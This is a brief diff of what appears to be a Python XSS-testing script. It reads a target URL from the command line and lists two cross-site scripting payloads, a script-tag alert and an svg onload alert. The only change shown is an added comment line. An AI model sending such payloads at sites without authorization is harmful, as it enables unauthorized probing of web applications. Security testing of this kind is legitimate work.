@@ -1,6 +1,6 @@
 import requests
 import sys
-
+#comment
 url = sys.argv[1]
 payloads = ["<script>alert(1)</script>", "\"<svg/onload=alert(1)>\""]
 
